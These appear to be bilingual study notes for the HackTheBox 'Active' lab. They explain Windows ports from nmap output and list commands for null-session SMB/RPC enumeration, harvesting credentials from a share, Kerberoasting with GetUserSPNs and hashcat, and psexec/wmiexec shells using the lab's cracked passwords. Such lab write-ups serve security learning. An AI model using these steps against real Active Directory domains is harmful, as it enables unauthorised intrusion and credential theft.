```JavaScript
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-07-12 12:40:55Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
`139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn`

- **139/tcp open** → 端口 139 对外开放。
    
- **netbios-ssn** → Nmap 识别到该端口运行的是 **NetBIOS Session Service**（NetBIOS 会话服务），通常用于 SMB over NetBIOS。
    
- **syn-ack** → TCP 探测返回了 SYN/ACK，确认端口开放。
    
- **Microsoft Windows netbios-ssn** → Nmap 推测这是 Windows 系统上的 NetBIOS 会话服务。
    

---

### 端口 139 的作用

- **协议层面**：NetBIOS Session Service（会话层协议）。
    
- **服务层面**：旧版 SMB 文件/打印共享服务在该端口上运行。
    
- **历史背景**：
    
    - 早期 Windows SMB 依赖 **NetBIOS over TCP/IP**（NBT），通过 139 提供文件共享和 IPC。
        
    - 现代 Windows SMB 可以直接用 **445/tcp**（SMB over TCP），无需 NetBIOS，但 139 仍然用于兼容旧系统。
      
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
**microsoft-ds**：这是 Nmap 对 **SMB/CIFS（Windows 文件共享）** 服务的常见标签（`microsoft-ds` = Microsoft Directory Services / SMB）。

464/tcp   open  kpasswd5?     syn-ack
593/tcp[[593]]   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
### 端口 3268 的作用

- **协议层面**：LDAP（Lightweight Directory Access Protocol）
    
- **服务层面**：**Global Catalog (GC)**
    
- **功能**：
    
    - 提供整个 Active Directory forest 的跨域查询。
        
    - 与普通 LDAP (389) 的区别：
        
        - **389/tcp** → 域内 LDAP 查询（只针对本域）
            
        - **3268/tcp** → Global Catalog 查询（跨域，部分属性集合）


5722/tcp  open  msrpc [[MSRPC]]  [[5722]]      syn-ack Microsoft Windows RPC
9389/tcp  open  mc-nmf  [[9389]]      syn-ack .NET Message Framing


47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         syn-ack Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack Microsoft Windows RPC
- Windows 从 **Vista / Server 2008** 开始，将 RPC 动态端口默认范围设为 **49152–65535**（以前是 1025–5000）。
    
- RPC 服务启动时，会在 135/tcp 上注册，然后 Endpoint Mapper 分配一个 **动态高端口**给客户端使用。
    
- 例如 DFSR、Exchange、打印服务、AD Web Services 等都会使用这些动态端口。
    

---

### 3️⃣ 服务与协议关系

|端口|协议|服务说明|
|---|---|---|
|135/tcp|MSRPC|Endpoint Mapper，告诉客户端服务分配的动态端口|
|49152–49155/tcp|MSRPC|具体 RPC 服务通信端口（DFS、ADWS 等）|


49157/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
```

[[135]]Port 135 is used by the Microsoft Windows RPC (Remote Procedure Call) service, while ports 139 and 445 are used for NetBIOS and SMB (Server Message Block) services. These services often work together in Windows environments, which is why you might use SMB enumeration tools even if you're initially looking at port 135.

### Relationship Between RPC, NetBIOS, and SMB

- **Port 135 (RPC):** RPC is used for inter-process communication. Many Windows services rely on RPC to function, including some aspects of SMB.
- **Port 139 (NetBIOS):** NetBIOS is a legacy protocol used for network communication on local networks. It often works in conjunction with SMB.
- **Port 445 (SMB):** SMB is used for sharing files, printers, and other resources over a network. Modern Windows systems typically use SMB directly over TCP/IP, without NetBIOS, using port 445.

  ### RPC、NetBIOS 和 SMB 的关系

- **端口 135 (RPC)：** RPC 用于进程间通信。许多 Windows 服务依赖于 RPC 才能正常运行，包括 SMB 的某些功能。
- **端口 139 (NetBIOS)：** NetBIOS 是一种用于局域网通信的旧协议。它通常与 SMB 配合使用。
- **端口 445 (SMB)：** SMB 用于在网络上共享文件、打印机和其他资源。现代 Windows 系统通常直接使用 TCP/IP 协议（​​端口 445）进行 SMB 通信，而无需使用 NetBIOS。
## RPC、NetBIOS、SMB 的关系总结

- **135/tcp → RPC (MSRPC)**
    
    - RPC = 远程过程调用，用来让客户端调用服务端的功能。
        
    - 很多 Windows 服务都通过 RPC 来实现（DFS、AD、打印服务、Exchange 等）。
        
    - **作用：**像“调度员”，告诉你某个 RPC 服务在哪个端口。
        
- **137/udp、138/udp、139/tcp → NetBIOS**
    
    - NetBIOS 是早期 LAN（局域网）的命名与会话服务。
        
    - SMB 在最初是跑在 **NetBIOS 上**的（即 139 端口）。
        
    - 137 = 名称解析，138 = 数据报，139 = 会话服务。
        
- **445/tcp → SMB (现代版本)**
    
    - 从 Windows 2000 开始，SMB 可以直接跑在 TCP 上（端口 445），不再依赖 NetBIOS。
        
    - **功能：**文件共享、打印机共享、认证、IPC（进程间通信管道）等。
        
    - 现代环境中，主要用 445，而 139 更多是为了兼容旧系统。  
### 端口 vs 协议 vs 服务

|端口 / 名称|对应协议|对应服务 / 功能|说明|
|---|---|---|---|
|**135/tcp**|**MSRPC**（协议）|**RPC**（Remote Procedure Call 服务）|Windows 的远程过程调用服务，很多系统服务依赖它，比如 DFSR、打印服务、AD 等。|
|**137/udp**|**NetBIOS Name Service**（协议）|**NetBIOS**（名称解析服务）|用于在 LAN 内解析计算机名到 IP 地址。|
|**138/udp**|**NetBIOS Datagram Service**（协议）|**NetBIOS**（广播/消息）|NetBIOS 数据报，用于简单消息或广播通信。|
|**139/tcp**|**NetBIOS Session Service**（协议）|**SMB over NetBIOS**（服务）|旧版 SMB 依赖 NetBIOS 会话进行文件/打印共享。|
|**445/tcp**|**SMB**（协议，直接基于 TCP）|**SMB / CIFS 服务**|现代 Windows 文件/打印共享服务，绕过 NetBIOS。|

---

### 🔹 总结

- **协议** = 定义通信规则和格式（MSRPC、NetBIOS、SMB）。
    
- **服务** = 实现某种功能的软件或角色（RPC 服务、SMB 文件共享服务、NetBIOS 名称服务）。
    
- **端口** = 服务/协议对外通信的入口（135、137、138、139、445 等）。
    

---

💡 小技巧记忆：

- **协议** → “语言和规则”
    
- **服务** → “做事情的软件或功能”
    
- **端口** → “窗口 / 门”
  

[[135]]135/tcp open msrpc syn-ack Microsoft Windows RPC
[[rpcclient]]
```JavaScript
 rpcclient -U "" -N 10.10.10.100 //-N , NO PASS
 rpcclient -U “user” <ip>
```

  

  
[[nbtscan]]
[[139]]: nbtscan -r 10.10.10.100

**NBT** stands for **NetBIOS over TCP/IP**.

  

```JavaScript
grep -i "password" *.json
grep -iR "password" .
```

  
[[389]]
389/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)  

ldapdomaindump -u 'active\SVC_TGS' -p 'GPPstillStandingStrong2k18' 10.10.10.100

  

ldapsearch -x -h 10.10.10.100 -b "dc=active,dc=htb"

  
[[rpcclient]]
rpcclient -U "" -N 10.10.10.100  
rpcclient $> enumdomusers

  

[[3268]]3268/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)

[[ldapsearch]]
```JavaScript
ldapsearch -H ldap://10.10.10.100:3268 -x -s base namingcontexts

cme ldap 10.10.10.100 -u '' -p '' 
```

```JavaScript
smbclient //10.10.10.100/replication  -N -c 'recurse;ls' 
smbclient //10.10.10.100/Replication -U "" -N

smbclient -N \\\\10.10.10.100\\Replication -U '' 
smbclient //10.10.10.100/replication -N -c "prompt OFF; recurse ON; mget *"
smbclient \\\\[ip]\\Replication


Try "help" to get a list of possible commands.
smb: \> mget *     
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> prompt 
smb: \> recurse on
smb: \> mget *
```

```JavaScript
grep -ri "password" /path/to/folder
```

  

user: pass

**SVC_**TGS : GPPstillStandingStrong2k18

```JavaScript
smbclient //10.10.10.100/users -U active.htb/SVC_TGS%GPPstillStandingStrong2k18  
enum4linux-ng -u svc_tgs -p GPPstillStandingStrong2k18 -A 10.10.10.100
enum4linux  -u svc_tgs -p GPPstillStandingStrong2k18 -U 10.10.10.100 
rpcclient -U "active.htb\SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100
smbmap -u svc_tgs -p GPPstillStandingStrong2k18 -H 10.10.10.100 -r 'Users' 
```

```JavaScript
cat $(find .  -type f -name "user.txt")
```

```JavaScript
Get-ChildItem -Path C:\ -Recurse -Filter "user.txt" -File
```

```JavaScript
GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
hashcat -m 13100 -a 0 GetUserSPNs.out /users/share/wordlists/rockyou.txt --force 
```

```PHP
$krb5tgs$<etype>$*<username>$<realm>$<SPN>*<checksum>$<encrypted data>...

```

- `$krb5tgs`: Indicates a Kerberos Ticket Granting Service (TGS) hash.
- `23`: Encryption type, where 23 refers to RC4-HMAC.
- `Administrator`: The username associated with the service account, which in this case is `Administrator`.
- `ACTIVE.HTB`: The Kerberos realm or domain.
- `active.htb/Administrator`: The service principal name (SPN).

  

```JavaScript
smbexec.py Administrator:Ticketmaster1968@10.10.10.100     
wmiexec.py Administrator:Ticketmaster1968@10.10.10.10
psexec.py Administrator:Ticketmaster1968@10.10.10.100
```

```JavaScript
smbclient //10.10.10.100/users -U active.htb/administrator%Ticketmaster1968  -c "prompt OFF; recurse ON; mget *"
```

```JavaScript
cat $(find .  -type f -name "root.txt")

```

`GetUserSPNs` should be used after obtaining valid credentials for a domain user, especially when those credentials have administrative privileges. This tool is used to identify service accounts that have Service Principal Names (SPNs) registered in a Windows Active Directory domain. These service accounts often have higher privileges and can be targeted for further attacks, such as Kerberoasting.

### Key Reasons to Use `GetUserSPNs`:

1. **Identify Service Accounts**:
    - Service accounts typically have higher privileges and are used to run services on the network.
    - Identifying these accounts can help in targeting high-value accounts for further exploitation.
2. **Kerberoasting Attack**:
    - `GetUserSPNs` can be used to extract service tickets for the identified SPNs.
    - These tickets can then be cracked offline to obtain the plaintext passwords of the service accounts.
3. **Privilege Escalation**:
    - Service accounts may have elevated privileges, and compromising them can provide higher-level access to the network.